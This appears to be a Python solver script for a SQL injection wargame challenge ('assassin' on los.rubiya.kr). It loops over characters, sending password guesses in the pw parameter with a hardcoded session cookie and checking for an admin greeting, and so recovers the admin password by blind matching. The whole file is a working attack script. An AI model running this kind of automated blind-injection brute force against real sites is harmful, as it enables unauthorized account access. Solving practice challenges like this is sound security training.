import urllib.request
import requests

url='https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php'
headers = { 'Cookie': 'PHPSESSID=8u0ue0omqon5eb2fqcmr03ev33' }
pw=""

for i in range (1,8):
    for j in range(48, 123):
        query='?pw={}'.format(pw + chr(j))
        print(query)
        r = requests.get(url + query, headers=headers)
        if r.text.find("<h2>Hello admin</h2>") != -1:
            pw += chr(j)
            print('password is ', pw)
            break